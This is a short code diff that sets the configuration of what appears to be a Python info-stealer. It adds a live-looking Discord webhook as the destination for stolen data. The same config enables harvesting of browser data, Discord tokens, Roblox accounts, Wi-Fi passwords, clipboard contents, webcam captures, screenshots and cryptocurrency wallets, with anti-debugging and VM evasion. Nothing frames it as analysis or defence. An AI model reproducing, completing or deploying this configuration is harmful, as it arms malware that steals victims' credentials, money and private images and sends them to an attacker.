@@ -1,5 +1,4 @@
-__CONFIG__ = {'webhook': 
-, 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': False, 'systeminfo': True, 'common_files': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'wifi': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': True, 'webcam': True, 'games': True, 'screenshot': True, 'mutex': 'TuvZSp6rrzY4DERm', 'wallets': True}
+__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1245973273704009750/ia2Mdl0ZgYCn1lbh5t9toe7S9Lfa8fcdBu2FpkRvrD9ljNH0fpGc7eGXp59KzMlyLSc', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': False, 'systeminfo': True, 'common_files': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'wifi': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': True, 'webcam': True, 'games': True, 'screenshot': True, 'mutex': 'TuvZSp6rrzY4DERm', 'wallets': True}
 
 import concurrent.futures
 import ctypes
